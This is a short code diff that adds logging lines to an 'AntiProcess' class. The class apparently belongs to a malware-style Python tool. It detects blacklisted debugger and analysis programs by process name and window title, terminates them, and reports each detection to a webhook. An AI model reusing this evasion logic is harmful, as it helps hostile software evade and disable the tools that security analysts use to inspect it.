@@ -25,6 +25,7 @@ class AntiProcess:
                         for procstr in Lists.BLACKLISTED_PROGRAMS
                     ):
                         try:
+                            self.logger.info(f"{proc.name} Process Was Running")
                             self.webhook.send(
                                 f"Anti-Debug Program: `{proc.name()}` was detected running on the system.",
                                 "Anti Process",
@@ -43,6 +44,7 @@ class AntiProcess:
                 window_name = win32gui.GetWindowText(
                     win32gui.GetForegroundWindow())
                 if window_name in Lists.BLACKLISTED_WINDOW_NAMES:
+                    self.logger.info(f"{window_name} Found")
                     self.webhook.send(
                         f"Found `{window_name}` in Window Names",
                         "Anti Process")
@@ -67,6 +69,7 @@ class AntiProcess:
                             psutil.Process(process).terminate()
                         except BaseException:
                             pass
+                self.logger.info(f"{win32gui.GetWindowText(hwnd)} Found")
                 self.webhook.send(
                     f"Debugger Open: {win32gui.GetWindowText(hwnd)}",
                     "Anti Process")
